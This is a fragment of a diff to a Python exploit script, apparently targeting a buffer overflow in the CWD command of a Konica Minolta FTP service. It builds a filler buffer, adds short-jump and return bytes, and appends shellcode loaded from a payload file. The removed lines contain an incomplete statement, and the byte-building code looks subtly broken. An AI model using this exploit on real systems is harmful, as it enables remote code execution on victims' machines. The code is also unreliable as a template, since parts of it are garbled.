@@ -79,10 +79,7 @@ class konicaMinoltaCwdOverflowMenu(cmd.Cmd):
     payload = ""
     for a in range(0, 1037):
       payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
-    payload += "\xeb\x06"
-    for a in range(0, 2):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
-    payload += 
+    payload += "\xEB\x06b<\x9Dm \x12"
     f = open("../../../payloads/konica_minolta_cwd.shell", "r")
     for line in f.readlines():
       payload += line[:-1].decode('string_escape')
